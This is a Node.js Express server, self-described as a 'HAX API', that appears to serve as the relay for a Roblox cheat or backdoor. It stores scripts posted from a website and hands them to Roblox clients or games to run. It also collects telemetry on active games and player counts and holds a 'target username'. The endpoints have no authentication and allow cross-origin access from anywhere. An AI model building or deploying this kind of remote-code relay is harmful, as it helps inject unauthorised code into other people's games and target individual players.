const express = require('express');
const app = express();

app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
    if (req.method === 'OPTIONS') return res.sendStatus(200);
    next();
});

app.use(express.json({ limit: '10mb' }));
app.use(express.text({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));

let latestScript = "";
let gamesData = [];
let globalPlayers = 0;
let targetUsername = ""; // 👈 new

app.use((err, req, res, next) => {
    console.error('Error:', err.message);
    res.status(500).json({ error: 'Internal server error' });
});

// Test endpoint
app.get('/api/test', (req, res) => {
    res.json({ 
        status: 'online', 
        games: gamesData.length,
        players: globalPlayers,
        storedScript: latestScript ? 'yes' : 'no',
        targetUser: targetUsername,
        timestamp: Date.now()
    });
});

app.get('/api/debug/script', (req, res) => {
    res.type('text/plain').send(latestScript || '(empty)');
});

// Website POSTs script
app.post('/api/execute', (req, res) => {
    try {
        latestScript = req.body || "";
        console.log('✅ Script stored, length:', latestScript.length);
        res.send('Script stored');
    } catch (e) {
        console.error('❌ Execute error:', e);
        res.status(500).send('Error storing script');
    }
});

// Roblox GETs script (and clears it)
app.get('/api/execute', (req, res) => {
    try {
        const script = latestScript;
        console.log('📤 Script retrieved, length:', script.length);
        res.send(script);
        latestScript = "";
    } catch (e) {
        console.error('❌ Execute get error:', e);
        res.status(500).send('');
    }
});

// Roblox POSTs game data
app.post('/api/games/update', (req, res) => {
    try {
        let data;
        if (typeof req.body === 'string') {
            try { data = JSON.parse(req.body); } catch { data = { games: [], globalPlayers: 0 }; }
        } else {
            data = req.body || { games: [], globalPlayers: 0 };
        }
        
        const allGames = data.games || [];
        gamesData = allGames.filter(g => parseInt(g.players) > 0);
        globalPlayers = data.globalPlayers || 0;
        
        console.log('📊 Games updated, active:', gamesData.length, 'players:', globalPlayers);
        res.status(200).send('OK');
    } catch (e) {
        console.error('Error updating games:', e);
        res.status(200).send('OK');
    }
});

app.get('/api/games', (req, res) => {
    res.json({ total: gamesData.length, players: globalPlayers, games: gamesData });
});

// 👇 NEW: Settings endpoints
app.post('/api/setuser', (req, res) => {
    try {
        targetUsername = req.body || "";
        console.log('🎯 Target username set to:', targetUsername);
        res.send('OK');
    } catch (e) {
        console.error('Error setting user:', e);
        res.status(500).send('Error');
    }
});

app.get('/api/getuser', (req, res) => {
    res.send(targetUsername);
});

app.get('/', (req, res) => {
    res.send('HAX API Running - ' + new Date().toISOString());
});

app.use((req, res) => {
    res.status(404).json({ error: 'Not found' });
});

process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception:', err);
});

process.on('unhandledRejection', (err) => {
    console.error('Unhandled Rejection:', err);
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`🚀 HAX Server running on port ${port}`);
});
